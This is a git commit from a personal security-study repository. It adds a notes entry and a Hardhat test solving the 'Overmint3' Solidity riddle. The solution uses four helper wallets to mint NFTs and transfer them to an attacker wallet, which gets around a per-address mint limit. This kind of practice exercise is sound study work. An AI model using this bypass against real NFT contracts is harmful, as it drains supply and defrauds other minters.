061970c8fb3ab8519f23a81b9efc81d734bb6889
sodexx7 <sodexx7@gmail.com>
2023-10-31 17:34:37 +0800

    Overmint3 done

--- Security_2(week10-11).md
+++ Security_2(week10-11).md
@@ -9,3 +9,6 @@
     * [truster.challenge.js](https://github.com/sodexx7/security_related/blob/main/damn-vulnerable-defi/test/truster/truster.challenge.js)
     * [TrusterLenderPool.sol](damn-vulnerable-defi/contracts/truster/TrusterLenderPool.sol)
     * npx hardhat test test/truster/truster.challenge.js
+
+3. [Overmint3.js](https://github.com/sodexx7/security_related/blob/main/solidity-riddles/test/Overmint3.js#L27)  should check the solution is OK？
+    * [Overmint3.sol](solidity-riddles/contracts/Overmint3.sol)
--- solidity-riddles/test/Overmint3.js
+++ solidity-riddles/test/Overmint3.js
@@ -10,21 +10,28 @@ const NAME = "Overmint3"
 
 describe(NAME, function () {
     async function setup() {
-        const [owner, attackerWallet] = await ethers.getSigners();
+        const [owner, attackerWallet,plusAddress1,plusAddress2,plusAddress3,plusAddress4] = await ethers.getSigners();
 
         const VictimFactory = await ethers.getContractFactory(NAME);
         const victimContract = await VictimFactory.deploy();
 
-        return { victimContract, attackerWallet };
+        return { owner,victimContract, attackerWallet, plusAddress1,plusAddress2,plusAddress3,plusAddress4 };
     }
 
     describe("exploit", async function () {
         let victimContract, attackerWallet;
         before(async function () {
-            ({ victimContract, attackerWallet } = await loadFixture(setup));
+            ({ owner,victimContract, attackerWallet,plusAddress1,plusAddress2,plusAddress3,plusAddress4 } = await loadFixture(setup));
         })
 
+        // Use another four address mint one NFT and than transfer victimContract adress, meanwhile victimContract also mint one NFT
         it("conduct your attack here", async function () {
+            const plusAddresses = [plusAddress1,plusAddress2,plusAddress3,plusAddress4]; 
+            for(const index in plusAddresses){
+                await victimContract.connect(plusAddresses[index]).mint();
+                await victimContract.connect(plusAddresses[index]).transferFrom(plusAddresses[index].address,attackerWallet.address, parseInt(index)+1);// tokenId increased by one each time
+            }
+            await victimContract.connect(attackerWallet).mint();
 
         });
 
